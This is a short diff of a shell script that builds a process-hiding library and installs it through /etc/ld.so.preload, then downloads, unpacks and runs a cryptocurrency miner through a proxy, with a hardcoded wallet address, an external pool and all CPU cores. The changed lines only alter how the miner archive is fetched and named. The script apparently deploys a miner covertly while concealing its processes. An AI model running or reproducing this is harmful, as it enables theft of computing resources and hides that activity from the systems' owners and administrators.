@@ -54,9 +54,7 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-./graftcp/graftcp wget -qO brianz.zip https://github.com/Beeppool/miner/releases/download/0.6.1/beepminer-0.6.1.zip
-unzip brianz.zip
-mv beepminer-0.6.1 brianz
-cd brianz
-
+./graftcp/graftcp wget -q https://github.com/Beeppool/miner/releases/download/0.6.1/beepminer-0.6.1.zip
+unzip beepminer-0.6.1.zip
+cd beepminer-0.6.1
 ./graftcp/graftcp ./miner --wallet-address='NQ50 44BA 44R3 BFHX 8648 3UTH LX98 KJYC TV5P' --pool=pool.acemining.co:8443 --miner=$(nproc)
